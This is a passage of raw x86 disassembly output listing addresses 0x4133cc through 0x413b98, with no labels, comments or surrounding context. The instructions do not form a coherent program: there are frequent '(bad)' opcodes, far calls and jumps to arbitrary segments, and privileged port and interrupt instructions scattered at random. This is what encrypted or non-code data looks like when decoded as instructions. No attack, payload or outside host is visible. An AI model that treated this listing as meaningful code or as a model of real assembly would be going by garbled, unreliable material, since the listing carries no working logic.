  4133cc:	scas   al,BYTE PTR es:[edi]
  4133cd:	cmp    ah,cl
  4133cf:	ja     0x41343f
  4133d1:	xchg   DWORD PTR [ebp+0x43070bb7],esp
  4133d7:	sub    eax,0x8c2c6f41
  4133dc:	dec    esp
  4133dd:	xor    eax,0x5d39a322
  4133e2:	test   eax,0x35b620aa
  4133e7:	push   ds
  4133e8:	push   edi
  4133e9:	mov    ch,BYTE PTR [edx-0x16086666]
  4133ef:	imul   edx,DWORD PTR [ebp+0x1c],0xdb7c2e1e
  4133f6:	mov    dh,0x95
  4133f8:	push   cs
  4133f9:	inc    esp
  4133fa:	(bad)
  4133fe:	and    DWORD PTR [ecx+ecx*1+0x622cc6e3],esi
  413405:	outs   dx,DWORD PTR gs:[esi]
  413407:	or     BYTE PTR [eax],0x1c
  41340a:	mov    ecx,0x2085b763
  41340f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413410:	xchg   ecx,eax
  413411:	sub    BYTE PTR [esi],bl
  413413:	pop    eax
  413414:	lea    edi,[edx]
  413416:	inc    ebp
  413417:	inc    esp
  413418:	fist   WORD PTR [edi]
  41341a:	mov    edx,0x49ba2aa8
  41341f:	cmp    dl,BYTE PTR [edi]
  413421:	addr16 icebp 
  413423:	mov    cl,BYTE PTR [bx+di+0x2b]
  413427:	call   0x94de25be
  41342c:	loope  0x41342e
  41342e:	push   ecx
  41342f:	inc    ebx
  413430:	jecxz  0x4133df
  413432:	jne    0x4133fd
  413434:	and    bl,dl
  413436:	add    BYTE PTR [eax+0x2d],dl
  413439:	and    DWORD PTR [ecx],eax
  41343b:	cmp    BYTE PTR [esi+0x1c],dh
  41343e:	bound  ebp,QWORD PTR [ebp-0x15]
  413441:	add    al,0x1f
  413443:	retf   0x22f1
  413446:	xor    al,0x37
  413448:	arpl   cx,si
  41344a:	pop    ds
  41344b:	jmp    0xba3ae425
  413450:	and    ch,dh
  413452:	add    DWORD PTR [ebp+0x7f],0xffffff80
  413456:	inc    esi
  413457:	call   0xbcdc:0x5faf18b3
  41345e:	sahf   
  41345f:	(bad)  
  413460:	jnp    0x4134b6
  413462:	fcomp  QWORD PTR [edi-0x1ecacb6a]
  413468:	sar    BYTE PTR [eax],cl
  41346a:	shl    ecx,cl
  41346c:	inc    edi
  41346d:	je     0x4134c6
  41346f:	clc    
  413470:	pop    edi
  413471:	jmp    0x413404
  413473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413474:	push   ecx
  413475:	xor    al,0xb
  413477:	imul   ecx,DWORD PTR [ebx],0x76c7d41c
  41347d:	or     BYTE PTR [edx-0x6e512649],ch
  413483:	dec    edi
  413484:	jae    0x413439
  413486:	pop    edx
  413487:	or     BYTE PTR [esi+eax*1],bl
  41348a:	popf   
  41348b:	push   0x68335ac
  413490:	sub    al,0x7
  413492:	sahf   
  413493:	add    ebp,DWORD PTR [ebx+0x7b]
  413496:	jmp    0xcf67:0x51106495
  41349d:	push   es
  41349e:	jmp    0x223813c2
  4134a3:	(bad)  
  4134a4:	cli    
  4134a5:	cmp    BYTE PTR [ebp+0x3e],ch
  4134a8:	pop    es
  4134a9:	sub    al,0xbf
  4134ab:	int    0x77
  4134ad:	(bad)  [edx]
  4134af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134b1:	outs   dx,BYTE PTR ds:[esi]
  4134b2:	xchg   ecx,eax
  4134b3:	test   eax,esi
  4134b5:	xor    ah,BYTE PTR [ebx-0xc93149f]
  4134bb:	mov    esp,DWORD PTR [ebx+0x774d3be]
  4134c1:	loopne 0x413525
  4134c3:	outs   dx,BYTE PTR ds:[esi]
  4134c4:	inc    eax
  4134c5:	lock add ebp,DWORD PTR [ebp-0x34]
  4134c9:	xchg   esp,eax
  4134cb:	fdivr  DWORD PTR [eax-0x63]
  4134ce:	loopne 0x4134c1
  4134d0:	lahf   
  4134d1:	push   ss
  4134d2:	xchg   ebp,eax
  4134d3:	xchg   esp,eax
  4134d4:	sar    DWORD PTR [edx+0x2b24f689],cl
  4134da:	inc    ecx
  4134db:	mov    cl,0xed
  4134dd:	mov    bl,0x55
  4134df:	pop    ds
  4134e0:	jae    0x41346a
  4134e2:	popf   
  4134e3:	adc    al,0x0
  4134e5:	inc    eax
  4134e6:	sbb    BYTE PTR [ecx+edi*8-0x481dd73c],dl
  4134ed:	sahf   
  4134ee:	mov    esi,ebx
  4134f0:	jg     0x413472
  4134f2:	mov    edx,0xad237fd5
  4134f7:	dec    ecx
  4134f8:	jmp    0x177e:0x77bd0dc0
  4134ff:	into   
  413500:	and    ebp,ebp
  413502:	mov    bh,0x17
  413504:	xchg   ebx,eax
  413505:	and    eax,0xb1a85ab7
  41350a:	inc    eax
  41350b:	push   eax
  41350c:	stos   BYTE PTR es:[edi],al
  41350d:	pop    ebx
  41350e:	retf   0xa8d1
  413511:	mov    ah,0x9e
  413513:	mov    dl,0xbe
  413515:	mov    bl,0xc6
  413517:	lds    ebp,FWORD PTR [edi]
  413519:	lea    esp,[edx]
  41351b:	lock mov ecx,0x83ca76bc
  413521:	and    DWORD PTR [ecx],edx
  413523:	jns    0x413589
  413525:	cmp    al,0xe1
  413527:	sahf   
  413528:	jl     0x41353f
  41352a:	loop   0x413503
  41352c:	pop    esp
  41352d:	xchg   ecx,eax
  41352e:	call   0x601a:0x8106f4c3
  413535:	hlt    
  413536:	mov    ch,0x97
  413538:	aam    0x82
  41353a:	daa    
  41353b:	xor    DWORD PTR [esi+0x1f089979],0x12cf4c25
  413545:	out    0x7b,eax
  413547:	xor    ebp,DWORD PTR [ecx-0x776ead13]
  41354d:	les    eax,FWORD PTR [ebp-0x19]
  413550:	inc    esi
  413551:	push   0xffffffde
  413553:	scas   al,BYTE PTR es:[edi]
  413554:	dec    edx
  413555:	jg     0x413504
  413557:	frstor [ecx]
  413559:	jnp    0x413516
  41355b:	xor    DWORD PTR [edx+esi*8],0xffffffd6
  41355f:	popf   
  413560:	sahf   
  413561:	(bad)  
  413562:	leave  
  413563:	add    al,0xf9
  413565:	(bad)  
  413566:	xor    BYTE PTR [edx-0x2edd08be],cl
  41356c:	dec    DWORD PTR cs:[esi+0x5]
  413570:	adc    al,al
  413572:	mov    esp,0x50c42b22
  413577:	pop    esp
  413578:	push   0x4d
  41357a:	das    
  41357b:	push   edi
  41357c:	iret   
  41357d:	or     bl,0x1e
  413580:	xchg   ebx,eax
  413581:	inc    ecx
  413582:	call   0xe145:0x9c9e0621
  413589:	xchg   esi,eax
  41358a:	imul   edi,DWORD PTR [ecx+0x2d],0x4fca7bf5
  413591:	inc    eax
  413592:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413593:	sbb    DWORD PTR [esi-0x73],0x65
  413597:	mov    cl,0x50
  413599:	adc    BYTE PTR [ecx-0x59b2198d],al
  41359f:	xor    eax,0x46c2fc36
  4135a4:	sbb    al,0xf6
  4135a6:	sbb    DWORD PTR [edx],ecx
  4135a8:	and    al,0xaa
  4135aa:	mov    ebp,0x8c0bb59
  4135af:	mov    cl,0x14
  4135b1:	popf   
  4135b2:	loopne 0x413572
  4135b4:	sub    ah,BYTE PTR gs:[edx+ebp*8+0x315b4813]
  4135bc:	dec    ebx
  4135bd:	out    dx,al
  4135be:	shr    bl,1
  4135c0:	lock mov DWORD PTR [esi+0x17],esp
  4135c4:	scas   eax,DWORD PTR es:[edi]
  4135c5:	loope  0x413607
  4135c7:	shl    BYTE PTR [edx],0xbf
  4135ca:	cwde   
  4135cb:	and    cl,BYTE PTR [esi]
  4135cd:	retf   
  4135ce:	outs   dx,DWORD PTR ds:[esi]
  4135cf:	mov    edi,0xe88aeffd
  4135d4:	int    0xfa
  4135d6:	ret    0xe2b7
  4135d9:	xchg   edi,eax
  4135da:	adc    ecx,DWORD PTR [edi]
  4135dc:	pop    esi
  4135dd:	mov    bl,bl
  4135df:	xchg   ebp,eax
  4135e0:	inc    esi
  4135e1:	pop    ss
  4135e2:	pop    ds
  4135e3:	mov    cl,0x4c
  4135e5:	ret    
  4135e6:	xlat   BYTE PTR ds:[ebx]
  4135e7:	inc    ecx
  4135e8:	fimul  DWORD PTR [bp+si+0x28d5]
  4135ed:	inc    ecx
  4135ee:	mov    esp,?
  4135f0:	je     0x413639
  4135f2:	xor    al,0xd6
  4135f4:	mov    ss,WORD PTR [eax]
  4135f6:	pop    ecx
  4135f7:	push   0xffffffdb
  4135f9:	jo     0x41358f
  4135fb:	daa    
  4135fc:	adc    al,0x16
  4135fe:	push   esi
  4135ff:	ja     0x4135e2
  413601:	add    bl,BYTE PTR [edx+esi*1]
  413604:	bound  ebp,QWORD PTR [ebp+0x26f10650]
  41360a:	ds add eax,0x86084ea4
  413610:	mov    dl,0x8a
  413612:	push   eax
  413613:	ds imul esp
  413616:	xor    dl,BYTE PTR [ecx]
  413618:	rcr    BYTE PTR [edi-0x26],cl
  41361b:	fiadd  WORD PTR [edi+0x41a4a4ea]
  413621:	dec    ecx
  413622:	scas   al,BYTE PTR es:[edi]
  413623:	mov    bh,0x61
  413625:	push   es
  413626:	push   ecx
  413627:	jle    0x41366d
  413629:	push   edi
  41362a:	or     al,0x0
  41362c:	fnstenv [ecx]
  41362e:	scas   eax,DWORD PTR es:[edi]
  41362f:	xor    edi,DWORD PTR [ebp-0x62]
  413632:	adc    al,dh
  413634:	imul   edi,DWORD PTR [ebp-0x34],0xf389dcac
  41363b:	mov    esp,0xe082a80e
  413640:	ja     0x4135ef
  413642:	inc    ebp
  413643:	enter  0xb1d7,0x55
  413647:	lahf   
  413648:	xor    DWORD PTR [esi+0xf17ccf7],esi
  41364e:	mov    ch,0xa9
  413650:	imul   esi,DWORD PTR [eax+0x270e3dae],0xffffff89
  413657:	add    eax,0x39aebfe5
  41365c:	jns    0x4135ed
  41365e:	in     al,0xe3
  413660:	inc    eax
  413661:	out    dx,eax
  413662:	mov    dl,BYTE PTR [ecx-0x5d]
  413665:	sub    BYTE PTR [ebp-0x4ab4ce9],ch
  41366b:	cs in  eax,0xb3
  41366e:	inc    edi
  41366f:	jle    0x4135f9
  413671:	mov    ecx,0x3731aadc
  413676:	out    0x5f,eax
  413678:	sbb    al,0xe2
  41367a:	or     al,0x6e
  41367c:	mov    eax,ds:0x466e622f
  413681:	jmp    0x4d2:0xbdd35e2b
  413688:	add    edi,0x6e
  41368b:	mov    dh,0xb6
  41368d:	dec    esi
  41368e:	or     ecx,DWORD PTR [ecx]
  413690:	daa    
  413691:	pop    esi
  413692:	push   ebx
  413693:	cmp    DWORD PTR [edx-0x21],esp
  413696:	test   BYTE PTR [ecx-0x23],0x2e
  41369a:	jae    0x4136c9
  41369c:	test   DWORD PTR [edx-0x351d2b9e],ebp
  4136a2:	adc    bl,dh
  4136a4:	adc    BYTE PTR [edx+0x22],al
  4136a7:	sub    BYTE PTR [ebx+0x3c1ec99c],al
  4136ad:	mov    edx,0x5c9d1dce
  4136b2:	dec    ebx
  4136b3:	(bad)  
  4136b4:	mov    esp,0x341c1a8a
  4136b9:	imul   esi,DWORD PTR [ecx-0x5d],0x3e
  4136bd:	cdq    
  4136be:	add    ah,al
  4136c0:	mov    esp,0x8d032a56
  4136c5:	add    eax,0x719e802
  4136ca:	aam    0x8
  4136cc:	cli    
  4136cd:	fs jo  0x4136eb
  4136d0:	sub    esp,esp
  4136d2:	cmc    
  4136d3:	and    al,0xaa
  4136d5:	xor    DWORD PTR [ecx+edx*2+0x3224ffd2],ebp
  4136dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136dd:	repnz push ecx
  4136df:	push   0xffffffb4
  4136e1:	(bad)  
  4136e2:	outs   dx,BYTE PTR ds:[esi]
  4136e3:	adc    al,0x4b
  4136e5:	or     al,0xbc
  4136e7:	into   
  4136e8:	stc    
  4136e9:	and    ebp,esp
  4136eb:	dec    esp
  4136ec:	push   eax
  4136ed:	or     ch,BYTE PTR [ebp+0x338cc18f]
  4136f3:	jp     0x4136aa
  4136f5:	sub    eax,0x5b863505
  4136fa:	retf   
  4136fb:	je     0x41372e
  4136fd:	adc    eax,0x27eeae9e
  413702:	push   0x58d35df2
  413707:	(bad)  
  413708:	pop    esi
  413709:	punpckhdq mm5,QWORD PTR [eax]
  41370c:	fist   WORD PTR [edx-0x6aeae613]
  413712:	sbb    DWORD PTR [edi+edx*2-0x344fef3a],edx
  413719:	test   BYTE PTR [ecx+esi*4-0x60],dl
  41371d:	mov    ebp,DWORD PTR [ebx]
  41371f:	outs   dx,DWORD PTR ds:[esi]
  413720:	or     al,0xa6
  413722:	fnstenv [eax+0x5a40cae3]
  413728:	sar    DWORD PTR [ecx-0x4e8582d5],1
  41372e:	ret    0xac45
  413731:	iret   
  413732:	add    ch,BYTE PTR [ebx+0x23e4eaa9]
  413738:	dec    edx
  413739:	daa    
  41373a:	cmp    eax,0xb6c73e37
  41373f:	dec    ebx
  413740:	jno    0x4137c0
  413742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413743:	xor    DWORD PTR ds:0x63e0584b,0x23
  41374a:	rcr    BYTE PTR [ebp+0x37f0efd9],cl
  413750:	mov    DWORD PTR [esi+eax*2],edx
  413753:	test   al,0xb2
  413755:	push   edx
  413756:	sbb    ah,BYTE PTR [edi-0x53]
  413759:	outs   dx,BYTE PTR ds:[esi]
  41375a:	add    ebx,DWORD PTR [eax-0x45]
  41375d:	adc    al,BYTE PTR [ecx-0x2f7c7d11]
  413763:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413764:	add    dl,BYTE PTR [esi-0x1f]
  413767:	bound  eax,QWORD PTR [edx+0x557ac8]
  41376d:	pop    ebx
  41376e:	xor    al,0xcb
  413770:	push   0x4c1636e0
  413775:	sbb    BYTE PTR [ecx+0x196238a8],cl
  41377b:	cmp    ah,al
  41377d:	jno    0x413701
  41377f:	mov    dh,0x1a
  413781:	dec    esi
  413782:	xchg   ebx,eax
  413783:	cld    
  413784:	adc    al,0x9f
  413786:	pop    ss
  413787:	(bad)  
  413788:	into   
  413789:	gs cmp BYTE PTR fs:[edi-0x33],0xf4
  41378f:	pop    ds
  413790:	cmp    eax,DWORD PTR [ebx]
  413792:	mov    bl,0x3c
  413794:	nop
  413795:	add    BYTE PTR [ebx-0x13538b53],cl
  41379b:	sub    ch,dh
  41379d:	ds xchg esi,eax
  41379f:	push   ss
  4137a0:	dec    edi
  4137a1:	xchg   BYTE PTR [ecx-0x1a],bl
  4137a4:	and    DWORD PTR [esi+eax*1-0x17],0x36
  4137a9:	fs loope 0x4137c9
  4137ac:	xchg   DWORD PTR [ebp-0x18],ebx
  4137af:	sbb    eax,0xaa534946
  4137b4:	push   0x2408f7bf
  4137b9:	nop
  4137ba:	and    DWORD PTR [edx+eax*4],ecx
  4137bd:	inc    eax
  4137be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137bf:	aad    0xb0
  4137c1:	sahf   
  4137c2:	inc    esi
  4137c3:	loope  0x41375d
  4137c5:	lods   eax,DWORD PTR ds:[esi]
  4137c6:	ret    0x8cac
  4137c9:	or     al,0xd6
  4137cb:	mov    edi,0xf146878a
  4137d0:	push   eax
  4137d1:	xchg   esi,eax
  4137d2:	(bad)  
  4137d3:	addr16 hlt 
  4137d5:	sbb    DWORD PTR [edi+0x6],0xffffffc1
  4137d9:	stos   BYTE PTR es:[edi],al
  4137da:	push   ds
  4137db:	mov    edx,0xb84dba4d
  4137e0:	cmp    BYTE PTR [eax+0x4a],ch
  4137e3:	lds    ebp,FWORD PTR [ebp+0x74e2b0c4]
  4137e9:	pop    ebx
  4137ea:	pop    eax
  4137eb:	xor    esp,eax
  4137ed:	in     al,0x4c
  4137ef:	jmp    0x402a:0x643bc7bf
  4137f6:	icebp  
  4137f7:	mov    edi,0x8c8d05be
  4137fc:	sbb    eax,0x838045ca
  413801:	fdiv   DWORD PTR [eax-0x7c]
  413804:	xor    ebp,DWORD PTR [eax]
  413806:	sti    
  413807:	outs   dx,DWORD PTR ds:[esi]
  413808:	data16 mov bh,0xb2
  41380b:	retf   
  41380c:	popf   
  41380d:	push   ebp
  41380e:	(bad)
  413811:	add    BYTE PTR ds:0xde024ab0,ah
  413817:	stos   DWORD PTR es:[edi],eax
  413818:	and    eax,0xdc210640
  41381d:	sbb    esi,DWORD PTR [eax]
  41381f:	cmp    ah,dh
  413821:	arpl   WORD PTR [ebp-0x7a3749fc],sp
  413827:	(bad)  
  413828:	dec    esp
  413829:	fisttp DWORD PTR [esi-0x7f05d475]
  41382f:	ins    DWORD PTR es:[edi],dx
  413830:	cmc    
  413831:	sub    DWORD PTR [esi-0x466a227c],0xffffffe5
  413838:	int3   
  413839:	sub    al,bh
  41383b:	ins    DWORD PTR es:[edi],dx
  41383c:	sahf   
  41383d:	pop    esi
  41383e:	daa    
  41383f:	cmc    
  413840:	xchg   edx,eax
  413841:	mul    esp
  413843:	lods   eax,DWORD PTR ds:[esi]
  413844:	or     BYTE PTR [esi+0x19],dl
  413847:	lods   eax,DWORD PTR ds:[esi]
  413848:	loopne 0x413898
  41384a:	(bad)  
  41384b:	icebp  
  41384c:	inc    ecx
  41384d:	xchg   edi,eax
  41384e:	xchg   edx,eax
  41384f:	repnz (bad) 
  413851:	gs popf 
  413853:	das    
  413854:	add    BYTE PTR [ebx],0xa5
  413857:	popf   
  413858:	cmp    dl,BYTE PTR [edi]
  41385a:	jl     0x413812
  41385c:	mov    esp,0xa6d20302
  413861:	nop
  413862:	shl    DWORD PTR [ecx+0x5b365e9],1
  413868:	les    ebp,FWORD PTR [ecx+0x73]
  41386b:	adc    DWORD PTR [ecx],edi
  41386d:	dec    eax
  41386e:	push   cs
  41386f:	cmp    cl,dl
  413871:	push   es
  413872:	aad    0x89
  413874:	push   ebp
  413875:	cwde   
  413876:	aad    0x38
  413878:	dec    edi
  413879:	pop    edx
  41387a:	push   ebx
  41387b:	mov    cl,0x68
  41387d:	dec    esp
  41387e:	pop    ss
  41387f:	mov    esi,DWORD PTR [esi-0x16]
  413882:	mov    esi,0x24350e2f
  413887:	mov    edx,0x4a67fd3a
  41388c:	mov    BYTE PTR [eax+0x4f],ah
  41388f:	clc    
  413890:	aam    0x52
  413892:	outs   dx,DWORD PTR ds:[esi]
  413893:	sub    DWORD PTR [ebx+0x5],ebx
  413896:	stc    
  413897:	dec    eax
  413898:	jae    0x4138f9
  41389a:	sub    ebp,DWORD PTR [eax]
  41389c:	mov    BYTE PTR [edx+0x339173bf],ah
  4138a2:	fs jmp 0x9cd9f6bb
  4138a8:	inc    edi
  4138a9:	mov    WORD PTR [edi-0x2fce818f],gs
  4138af:	repz shr DWORD PTR [edx],0xf2
  4138b3:	out    0xa3,eax
  4138b5:	leave  
  4138b6:	jg     0x413849
  4138b8:	call   0x3b5b:0xe38c74a4
  4138bf:	repz sbb eax,0x701c634b
  4138c5:	loopne 0x41393f
  4138c7:	push   es
  4138c8:	outs   dx,BYTE PTR ds:[esi]
  4138c9:	push   0xffffff9b
  4138cb:	sub    ecx,DWORD PTR [ebx+ebp*8]
  4138ce:	fmulp  st(4),st
  4138d0:	inc    ebp
  4138d1:	loopne 0x41392f
  4138d3:	test   BYTE PTR [eax],0xad
  4138d6:	imul   ebp,DWORD PTR [edx-0xe9f528d],0xaa075019
  4138e0:	int    0x8e
  4138e2:	cmp    BYTE PTR [ebx+0x12],ch
  4138e5:	arpl   WORD PTR [edx-0x61],dx
  4138e8:	mov    edx,0xe7557a53
  4138ed:	cmc    
  4138ee:	bound  edx,QWORD PTR [esi-0x35]
  4138f1:	popf   
  4138f2:	jno    0x4138cb
  4138f4:	into   
  4138f5:	jo     0x413934
  4138f7:	popa   
  4138f8:	or     esi,DWORD PTR [ecx+0x3243db54]
  4138fe:	js     0x413968
  413900:	mov    ecx,0xd373820c
  413905:	jecxz  0x4138a0
  413907:	icebp  
  413908:	call   0x15b7:0x5299c46b
  41390f:	pusha  
  413910:	xor    al,0xea
  413912:	jmp    0x41390f
  413914:	jle    0x41395b
  413916:	push   ecx
  413917:	or     dh,BYTE PTR [esi+0x6c158258]
  41391d:	sbb    ah,BYTE PTR [eax+ebx*8-0x1d]
  413921:	inc    ecx
  413922:	(bad)  
  413923:	xor    eax,0x43c5c795
  413928:	into   
  413929:	sbb    DWORD PTR [edi+ebx*4-0x25301368],esi
  413930:	ret    
  413931:	xchg   edx,eax
  413932:	ret    
  413933:	mov    dl,0x27
  413935:	aas    
  413936:	xchg   edx,eax
  413937:	adc    eax,0x5a43e7f5
  41393c:	mov    bl,0x8b
  41393e:	jae    0x413968
  413940:	sbb    DWORD PTR [edx+eiz*2],ebp
  413943:	adc    esp,DWORD PTR [ecx+0x1c253dc]
  413949:	stc    
  41394a:	adc    cl,BYTE PTR [ebx-0x6d]
  41394d:	fcmovbe st,st(6)
  41394f:	ss xchg ecx,eax
  413951:	sbb    BYTE PTR [edi+0x31],cl
  413954:	(bad)  
  413955:	xor    ah,ch
  413957:	mov    bh,0xe3
  413959:	adc    DWORD PTR [esi],0x49a637b5
  41395f:	jg     0x4139d0
  413961:	mov    esp,0x8e2f7e3e
  413966:	adc    DWORD PTR [edx+0x6d71140c],eax
  41396c:	dec    edx
  41396d:	dec    eax
  41396e:	xchg   edx,eax
  41396f:	out    dx,al
  413970:	xchg   BYTE PTR [bx+di+0x198f],ch
  413975:	sub    al,0xea
  413977:	sub    eax,0x46eb7dcb
  41397c:	fdivr  DWORD PTR [esi]
  41397e:	int3   
  41397f:	fiadd  DWORD PTR [edi-0x68812402]
  413985:	repnz xchg ebx,eax
  413987:	sub    BYTE PTR fs:[esi-0x3a],ch
  41398b:	mov    ebx,0x29fa6479
  413990:	popa   
  413991:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413992:	into   
  413993:	xchg   ebx,eax
  413994:	jbe    0x4139ec
  413996:	jmp    FWORD PTR [ecx+ecx*8+0x21]
  41399a:	xchg   esi,eax
  41399b:	ret    
  41399c:	xchg   ebp,eax
  41399d:	dec    esp
  41399e:	xchg   ecx,eax
  41399f:	dec    ecx
  4139a0:	ret    
  4139a1:	mov    esp,0x57a0bac5
  4139a6:	test   al,0x3
  4139a8:	pop    ds
  4139a9:	or     ah,BYTE PTR [ebp+0xf]
  4139ac:	adc    al,0x90
  4139ae:	mov    esi,0x9d98cfdc
  4139b3:	add    al,0x82
  4139b5:	and    esp,DWORD PTR [ebp+0x4]
  4139b8:	lahf   
  4139b9:	dec    esp
  4139ba:	out    0x72,eax
  4139bc:	sbb    BYTE PTR [ebp+0x55],bh
  4139bf:	add    DWORD PTR [ecx],esi
  4139c1:	out    dx,eax
  4139c2:	call   0x517874a2
  4139c7:	test   DWORD PTR [eax],esi
  4139c9:	rol    DWORD PTR [edi-0x16af13b1],0x80
  4139d0:	cmp    BYTE PTR [ebp-0x2a],0xb1
  4139d4:	jno    0x413a46
  4139d6:	mov    ds:0xf70963c2,eax
  4139db:	xor    BYTE PTR [edx-0x6c],bh
  4139de:	ret    
  4139df:	mov    ebx,0xc019f9fd
  4139e4:	or     BYTE PTR [eax+0x2a172c27],bh
  4139ea:	jns    0x4139be
  4139ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139ed:	jns    0x413a01
  4139ef:	imul   ecx,DWORD PTR [eax+0x17]
  4139f3:	push   ecx
  4139f4:	ret    
  4139f5:	xor    dl,ah
  4139f7:	std    
  4139f8:	ja     0x4139df
  4139fa:	outs   dx,DWORD PTR ds:[esi]
  4139fb:	and    eax,0xa06136e2
  413a00:	rcl    DWORD PTR [edx+0x266c9fbe],1
  413a06:	xchg   ebp,eax
  413a07:	dec    esp
  413a08:	xlat   BYTE PTR ds:[ebx]
  413a09:	in     eax,dx
  413a0a:	pop    es
  413a0b:	add    BYTE PTR ds:0xe4e4d44c,dh
  413a11:	fwait
  413a12:	test   BYTE PTR [ebx-0xc186a9],0x39
  413a19:	push   ebx
  413a1a:	pop    esp
  413a1b:	adc    eax,0x328d625c
  413a20:	mov    dl,BYTE PTR [eax]
  413a22:	out    0xd8,al
  413a24:	and    eax,0x46878b87
  413a29:	int    0x97
  413a2b:	stos   DWORD PTR es:[edi],eax
  413a2c:	test   DWORD PTR [esi-0x5c],ebx
  413a2f:	sti    
  413a30:	out    dx,al
  413a31:	xor    eax,0xe39d2469
  413a36:	sbb    eax,0xa016e2f4
  413a3b:	pop    ds
  413a3c:	(bad)  
  413a3e:	mov    dl,BYTE PTR gs:[ebp+0x6738bbb6]
  413a45:	rol    cl,1
  413a47:	test   bh,0x10
  413a4a:	add    DWORD PTR [eax],edi
  413a4c:	ds cmp esi,eax
  413a4f:	out    dx,al
  413a50:	add    esp,DWORD PTR gs:[ebx+0x36]
  413a54:	popf   
  413a55:	je     0x413a5f
  413a57:	mov    ch,0x2
  413a59:	popa   
  413a5a:	pop    edx
  413a5b:	js     0x4139e9
  413a5d:	test   al,0x1e
  413a5f:	leave  
  413a60:	test   al,0xd3
  413a63:	sbb    ah,dh
  413a65:	hlt    
  413a66:	pop    ecx
  413a67:	add    al,0x3d
  413a69:	mov    eax,ds:0x23672034
  413a6e:	xor    eax,0x4303f1ae
  413a73:	cld    
  413a74:	je     0x413af5
  413a76:	les    ebx,FWORD PTR [esi+edx*8-0x63]
  413a7a:	pop    ss
  413a7b:	es sbb eax,0x59e6d28c
  413a81:	pop    ds
  413a82:	ins    DWORD PTR es:[edi],dx
  413a83:	ss mov dh,0x8d
  413a86:	jl     0x413a10
  413a88:	repnz in al,0xed
  413a8b:	cmp    eax,0x55fdb897
  413a90:	(bad)  
  413a91:	loopne 0x413a76
  413a93:	pusha  
  413a94:	or     al,0x59
  413a96:	xchg   esp,eax
  413a97:	or     ah,BYTE PTR [esi+eiz*8]
  413a9a:	arpl   dx,bp
  413a9c:	xchg   edx,eax
  413a9d:	mov    ecx,0x97ab28a6
  413aa2:	sub    eax,0x16d025a9
  413aa7:	push   es
  413aa8:	add    DWORD PTR [ebx+0x412da295],ebx
  413aae:	cmp    ecx,ecx
  413ab0:	stos   DWORD PTR es:[edi],eax
  413ab1:	ins    BYTE PTR es:[edi],dx
  413ab2:	iret   
  413ab3:	mov    ah,0x1c
  413ab5:	shr    DWORD PTR [eax-0x40],0xbd
  413ab9:	inc    edx
  413aba:	fist   DWORD PTR [edi-0x27]
  413abd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413abe:	and    al,0xa0
  413ac0:	sbb    al,0x82
  413ac2:	mov    DWORD PTR [eax+0xc0e5945],ebp
  413ac8:	aas    
  413ac9:	das    
  413aca:	mov    ch,0xdd
  413acc:	add    ecx,0xbda6362d
  413ad2:	sti    
  413ad3:	xchg   edx,eax
  413ad4:	(bad)  
  413ad5:	xor    ebp,DWORD PTR [ebp+0x6005b57d]
  413adb:	imul   ebx,DWORD PTR [ebx+0x3c],0xffffffff
  413adf:	lods   al,BYTE PTR ds:[esi]
  413ae0:	inc    ebp
  413ae1:	rcr    edx,cl
  413ae3:	scas   eax,DWORD PTR es:[edi]
  413ae4:	inc    ebp
  413ae5:	mov    eax,ds:0x8a7a2864
  413aea:	out    0x1a,al
  413aec:	mov    WORD PTR [di],fs
  413aef:	data16 cmp bh,BYTE PTR [edi+ebx*4+0x8]
  413af4:	sar    ebp,cl
  413af6:	cvtpi2ps xmm7,QWORD PTR [edx+ecx*2-0x4d]
  413afb:	outs   dx,BYTE PTR ds:[esi]
  413afc:	inc    ecx
  413afd:	jo     0x413b09
  413aff:	daa    
  413b00:	push   edx
  413b01:	lea    esi,[ebx-0x2f]
  413b04:	(bad)  
  413b05:	push   ebp
  413b06:	jmp    0x9bfb31c1
  413b0b:	sbb    esp,ebx
  413b0d:	mov    DWORD PTR es:[esp+esi*8-0x7a622476],ebx
  413b15:	dec    ecx
  413b16:	jmp    0x7660b1fa
  413b1b:	pop    ebx
  413b1c:	push   esi
  413b1d:	mov    al,0x5b
  413b1f:	std    
  413b20:	sub    DWORD PTR [edx+0x45],ebx
  413b23:	cmp    DWORD PTR ds:0xd620630c,esi
  413b29:	lock outs dx,BYTE PTR ds:[esi]
  413b2b:	lahf   
  413b2c:	or     al,0xe4
  413b2e:	sbb    DWORD PTR [esi],edi
  413b30:	xor    eax,0xb39aacad
  413b35:	outs   dx,BYTE PTR ds:[esi]
  413b36:	push   ss
  413b37:	fidiv  WORD PTR [eax+0x61867f34]
  413b3d:	outs   dx,DWORD PTR ds:[esi]
  413b3e:	add    BYTE PTR [ebp-0x7e],0x6b
  413b42:	cli    
  413b43:	bound  ebx,QWORD PTR [edx]
  413b45:	mov    ebp,0x37ba4375
  413b4b:	imul   esp,DWORD PTR [edx],0x50d4e219
  413b51:	or     ecx,0xfffffff1
  413b54:	sub    al,0xf9
  413b56:	sti    
  413b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b58:	pop    es
  413b59:	adc    DWORD PTR [eax+0x2d],edi
  413b5c:	ss pop ecx
  413b5e:	frstor ds:0xea0c11b3
  413b64:	mov    al,0x40
  413b66:	int    0x77
  413b68:	jne    0x413b62
  413b6a:	push   edx
  413b6b:	stc    
  413b6c:	push   ecx
  413b6d:	inc    ecx
  413b6e:	dec    ebx
  413b6f:	cmp    DWORD PTR ds:0x91d8d12c,edx
  413b75:	inc    DWORD PTR [ebx]
  413b77:	mov    cl,0x5e
  413b79:	dec    esp
  413b7a:	xchg   esp,eax
  413b7b:	sahf   
  413b7c:	and    bh,BYTE PTR [eax+eax*8+0x31e630a4]
  413b83:	xor    ah,al
  413b85:	pop    edi
  413b86:	mov    bl,0x2c
  413b88:	mov    al,ch
  413b8a:	cwde   
  413b8b:	and    dh,BYTE PTR [esi-0x277fdd65]
  413b91:	repnz fnsave [eax+0x7ba4348c]
  413b98:	cmp    eax,0x95e63c53
